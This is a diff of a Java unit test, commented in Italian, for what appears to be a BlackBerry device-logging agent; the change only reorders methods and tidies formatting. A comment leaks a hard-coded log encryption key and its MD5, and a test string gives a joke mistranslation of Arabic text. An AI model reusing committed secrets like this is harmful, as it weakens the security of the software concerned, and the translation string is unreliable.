@@ -20,14 +20,46 @@ public class UT_Log extends TestUnit {
         super(name, tests);
     }
 
-    public boolean run() throws AssertException {
+    private void CreateDeviceAgent() {
 
-        Path.makeDirs(true);
+        // per la 296, logKey = s06El1fQksievo4rtX3XjHWe4lqgxBpZ
+        // md5(logKey) = 4e400a3552be73aedb88077cef404314
 
-        CreatePlainDeviceLog();
-        CreateEncDeviceLog();
-        CreateDeviceAgent();
-        return true;
+        /*
+         * byte[] logKey = Utils
+         * .hexStringToByteArray("4e400a3552be73aedb88077cef404314");
+         * Keys.byteAesKey = logKey; Check.asserts(logKey.length == 16,
+         * "Wrong md5");
+         */
+
+        final Status status = Status.getInstance();
+        status.clear();
+
+        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, null);
+
+        final Thread thread = new Thread(agent);
+        thread.start();
+        agent.stop();
+
+        //#debug
+        debug.trace("Agent Device ok");
+    }
+
+    private void CreateEncDeviceLog() {
+
+        final Status status = Status.getInstance();
+        status.clear();
+
+        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, null);
+        final Log agentLog = LogCollector.getInstance().factory(agent, true);
+
+        agentLog.createLog(null);
+
+        final String content = "BlackBerry 8300\n128Kb Ram installed";
+        agentLog.writeLog(content, true);
+
+        agentLog.close();
+
     }
 
     private void CreatePlainDeviceLog() {
@@ -51,8 +83,9 @@ public class UT_Log extends TestUnit {
 
         AutoFlashFile file = new AutoFlashFile(Path.SD_PATH + "LOG_test1.log",
                 false);
-        if (file.exists())
+        if (file.exists()) {
             file.delete();
+        }
         file.create();
 
         file.append(plain.length);
@@ -67,8 +100,9 @@ public class UT_Log extends TestUnit {
         //#endif
 
         file = new AutoFlashFile(Path.SD_PATH + "LOG_test2.log", false);
-        if (file.exists())
+        if (file.exists()) {
             file.delete();
+        }
         file.create();
 
         file.append(plain.length);
@@ -93,57 +127,25 @@ public class UT_Log extends TestUnit {
         file.append(WChar.getBytes("\n"));
 
         // secondo chunk in arabo
-        final String ArabicText = "44062706200023064E062A064E0643064E0644064E06510645064F06200027064406520639064E0631064E0628064A064E06510629064E06";
-        final String ArabicTraslitteration = "\nTraslitterazione: a atakallamu al-'arabi'yah";
-        final String ArabicTranslation = "\nmettete la salsa bianca nel kebab\n";
+        final String arabicText = "44062706200023064E062A064E0643064E0644064E06510645064F06200027064406520639064E0631064E0628064A064E06510629064E06";
+        final String arabicTraslitteration = "\nTraslitterazione: a atakallamu al-'arabi'yah";
+        final String arabicTranslation = "\nmettete la salsa bianca nel kebab\n";
 
-        final byte[] arabic = Utils.hexStringToByteArray(ArabicText);
+        final byte[] arabic = Utils.hexStringToByteArray(arabicText);
 
         file.append(arabic);
-        file.append(WChar.getBytes(ArabicTraslitteration));
-        file.append(WChar.getBytes(ArabicTranslation));
+        file.append(WChar.getBytes(arabicTraslitteration));
+        file.append(WChar.getBytes(arabicTranslation));
         file.append(0); // string null terminated
     }
 
-    private void CreateEncDeviceLog() {
+    public boolean run() throws AssertException {
 
-        final Status status = Status.getInstance();
-        status.clear();
+        Path.makeDirs(true);
 
-        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, null);
-        final Log agentLog = LogCollector.getInstance().factory(agent, true);
-
-        agentLog.createLog(null);
-
-        final String content = "BlackBerry 8300\n128Kb Ram installed";
-        agentLog.writeLog(content, true);
-
-        agentLog.close();
-
-    }
-
-    private void CreateDeviceAgent() {
-
-        // per la 296, logKey = s06El1fQksievo4rtX3XjHWe4lqgxBpZ
-        // md5(logKey) = 4e400a3552be73aedb88077cef404314
-
-        /*
-         * byte[] logKey = Utils
-         * .hexStringToByteArray("4e400a3552be73aedb88077cef404314");
-         * Keys.byteAesKey = logKey; Check.asserts(logKey.length == 16,
-         * "Wrong md5");
-         */
-
-        final Status status = Status.getInstance();
-        status.clear();
-
-        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, null);
-
-        final Thread thread = new Thread(agent);
-        thread.start();
-        agent.stop();
-
-        //#debug
-        debug.trace("Agent Device ok");
+        CreatePlainDeviceLog();
+        CreateEncDeviceLog();
+        CreateDeviceAgent();
+        return true;
     }
 }
